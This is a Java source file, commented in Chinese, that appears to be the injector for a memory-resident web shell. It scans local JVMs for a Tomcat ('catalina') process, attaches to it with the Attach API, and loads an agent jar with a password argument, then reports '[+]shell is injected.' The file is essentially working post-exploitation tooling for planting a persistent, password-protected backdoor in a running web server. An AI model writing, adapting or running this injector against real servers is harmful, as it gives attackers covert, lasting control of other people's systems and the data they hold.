package net.sorry.attach;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

import java.io.File;
import java.util.Iterator;
import java.util.List;

public class reInject {
    public static void main(String[] args) throws Exception{
        if(args.length !=1){
            System.out.println("Usage:java -jar reInject.jar password");
        }else{
            VirtualMachine vm =null;//创建一个JVM对象
            List<VirtualMachineDescriptor> vmList = null;//关于JVM描述的List表
            //获取当前参数和路径
            String password = args[0];
            String currentPath = reInject.class.getProtectionDomain().getCodeSource().getLocation().getPath();
            //System.out.println("oldforcurrentPath:"+currentPath);
            currentPath = currentPath.substring(0,currentPath.lastIndexOf("/")+1);
            currentPath = java.net.URLDecoder.decode(currentPath, "utf-8");//解决空格或中文
            //System.out.println("newcurrentPath:"+currentPath);
            String agentFile = currentPath + "reAgent.jar";
            //System.out.println("agentFile:"+agentFile);
            agentFile = new File(agentFile).getCanonicalPath();
            String agentArgs = currentPath;
            if(!password.equals("")||password != null){
                agentArgs = agentArgs + "^" + password;
            }
            while(true){
                while(true){
                    try{
                        vmList = VirtualMachine.list();
                        if(vmList.size() > 0){
                            Iterator var8 = vmList.iterator();
                            while(var8.hasNext()){
                                VirtualMachineDescriptor vmd =(VirtualMachineDescriptor)var8.next();
                                if(vmd.displayName().indexOf("catalina") >= 0){
                                    System.out.println("[+]JVM's name is:   "+vmd.displayName());
                                    vm = VirtualMachine.attach(vmd);//通过VirtualMachineDescriptor附着
                                    //vm = VirtualMachine.attach("7128");//通过JVM的pid附着
                                    System.out.println("[+]OK.i find a jvm.");
                                    Thread.sleep(1000L);
                                    System.out.println("[+]OK.now the path of Agent JAR is:  "+agentFile);
                                    System.out.println("[+]OK.now the agentArgs is:     "+agentArgs);
                                    if(vm != null){
                                        vm.loadAgent(agentFile,agentArgs);//指定reAgent.jar包的位置，发送给Tomcat的JVM进程。
                                        System.out.println("[+]shell is injected.");
                                        vm.detach();//注入完后卸载
                                        return;
                                    }
                                }
                            }
                            Thread.sleep(3000);
                        }
                    }catch (Exception e){
                        e.printStackTrace();
                    }
                }
                }

        }
        //VirtualMachine vm = VirtualMachine.attach("7128");
        //vm.loadAgent("E:\\reAgent\\target\\sorry-1.0-SNAPSHOT-jar-with-dependencies.jar");
    }
}
